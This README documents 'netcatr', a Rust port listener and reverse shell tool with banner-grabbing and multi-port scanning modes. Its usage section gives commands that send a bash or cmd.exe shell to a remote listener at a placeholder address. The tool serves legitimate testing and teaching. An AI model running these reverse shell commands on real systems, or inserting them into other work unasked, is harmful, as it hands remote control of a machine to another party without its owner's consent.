# 📡 netcatr

```text
              _                 _
 _ __    ___ | |_   ___   __ _ | |_  _ __
| '_ \  / _ \| __| / __| / _` || __|| '__|
| | | ||  __/| |_ | (__ | (_| || |_ | |
|_| |_| \___| \__| \___| \__,_| \__||_|

```

📡 netcatr: A cross-platform port listener and reverse shell application designed for ease of use, providing seamless network connectivity.

## ✨ Features

- Command history & Tab completion (Interactive mode);
- CTRL-C blocking;
- Colors;
- Everything easy;

### Modes

- Listen mode (listen);
- Reverse shell mode (connect);

### Banner Grabber Mode (NEW!)
Grab a banner from a single service:

# Auto-detect protocol based on port
netcatr banner 192.168.1.1 80

# Specify protocol explicitly
netcatr banner -p http 192.168.1.1 80

# Grab SSH banner with verbose output
netcatr banner -p ssh -v 192.168.1.1 22

# Grab banner with custom timeout
netcatr banner -t 10 192.168.1.1 21

# Multi-port Banner Grabbing
Scan multiple ports at once:

# Scan common ports
netcatr banner -m "21,22,23,25,53,80,110,143,443,993,995" target.com

# Scan with verbose output and save to file
netcatr banner -m "80,443,8080,8443" -v -o scan_results.txt example.com

# Supported Protocols

auto - Auto-detect based on port (default)
http - HTTP banner grabbing
https - HTTPS banner grabbing
ftp - FTP welcome message
ssh - SSH version string
smtp - SMTP greeting
telnet - Telnet banner
raw - Raw TCP banner

Banner Grabber Examples:

# Basic HTTP banner grab
netcatr banner example.com 80

# HTTPS with verbose output
netcatr banner -p https -v secure-site.com 443

# FTP server identification
netcatr banner -p ftp ftp.server.com 21

# SSH version detection
netcatr banner -p ssh server.com 22

# Multi-protocol scan with output file
netcatr banner -m "21,22,80,443" -o results.txt target.server.com

# Raw banner grab with extended timeout
netcatr banner -p raw -t 15 custom.service.com 9999


## 🚀 Installation

To install **netcatr**, simply clone the repository and follow the instructions below:

```bash
git clone git@github.com:trinhminhtriet/netcatr.git
cd netcatr

cargo build --release
cp ./target/release/netcatr /usr/local/bin/
```

Running the below command will globally install the `netcatr` binary.

```bash
cargo install netcatr
```

## 💡 Usage

The most basic and useful example to start listening on a port would be (you can even run vim inside netcatr with this):

```bash
netcatr listen -ib 55600
```

and to connect:

```bash
netcatr connect -s bash the.0.0.ip 55600
```

Reverse shell from Windows:

```bash
netcatr connect -s cmd.exe the.0.0.ip 55600
```

## 🗑️ Uninstallation

Running the below command will globally uninstall the `netcatr` binary.

```bash
cargo uninstall netcatr
```

Remove the project repo

```bash
rm -rf /path/to/git/clone/netcatr
```

## 🤝 How to contribute

We welcome contributions!

- Fork this repository;
- Create a branch with your feature: `git checkout -b my-feature`;
- Commit your changes: `git commit -m "feat: my new feature"`;
- Push to your branch: `git push origin my-feature`.

Once your pull request has been merged, you can delete your branch.

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
